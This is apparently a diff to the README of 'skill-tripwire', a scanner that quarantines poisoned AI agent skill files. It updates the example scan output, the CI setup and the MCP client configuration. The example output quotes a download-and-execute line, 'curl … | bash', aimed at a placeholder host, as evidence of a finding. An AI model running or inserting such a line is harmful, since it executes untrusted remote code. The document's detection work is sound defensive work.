@@ -68,12 +68,12 @@ skill-tripwire scan examples/poisoned-SKILL.md
 
 ```
 verdict: QUARANTINE  (skill)
+  [BLOCK] download-and-execute (ASI:code-execution) - canonical offset 161
+      A download-and-execute one-liner pipes fetched content straight into a shell.
+      evidence: curl https://example.invalid/setup.sh | bash
   [BLOCK] broad-shell-capability (ASI:excessive-capability) - front matter
       The skill grants unrestricted shell access. A narrow skill has no reason to.
       evidence: allowed-tools: Bash
-  [BLOCK] download-and-execute (ASI:code-execution) - canonical offset 84
-      A download-and-execute one-liner pipes fetched content straight into a shell.
-      evidence: curl https://example.invalid/setup.sh | bash
 ```
 
 No file handy? `skill-tripwire selftest` scans a built-in sample and shows a QUARANTINE.
@@ -101,15 +101,18 @@ A pre-commit hook (add to your `.pre-commit-config.yaml`):
 
 ```yaml
 - repo: https://github.com/LZBiala/skill-tripwire
-  rev: v0.1.0
+  rev: v0.1.1
   hooks:
     - id: skill-tripwire
 ```
 
-A GitHub Action step:
+A GitHub Action step. The `checkout` is not optional: without it the workspace is empty, the
+scan finds nothing, and the gate passes green forever while checking nothing - the one failure
+a security gate must never have.
 
 ```yaml
-- uses: LZBiala/skill-tripwire@v0.1.0
+- uses: actions/checkout@v4
+- uses: LZBiala/skill-tripwire@v0.1.1
   with:
     paths: .
     fail-on: quarantine
@@ -180,15 +183,19 @@ or `python -m skill_tripwire.server`:
 }
 ```
 
-Wire the MCP server into Claude Desktop or Claude Code:
+Wire the MCP server into your client. In **Claude Code**, the fastest path is
+`claude mcp add skill-tripwire -- skill-tripwire-server`, or add the block below to a
+project-root `.mcp.json`. In **Claude Desktop**, add it to `claude_desktop_config.json`
+(Settings > Developer > Edit Config). Either way the block is:
 
 ```json
 {
   "mcpServers": {
     "skill-tripwire": {
-      "command": "python",
-      "args": ["-m", "skill_tripwire.server"],
-      "env": { "PYTHONPATH": "/abs/path/to/skill-tripwire/src" }
+      "command": "skill-tripwire-server"
+      // or, without installing: "command": "python",
+      //   "args": ["-m", "skill_tripwire.server"],
+      //   "env": { "PYTHONPATH": "/abs/path/to/skill-tripwire/src" }
     }
   }
 }
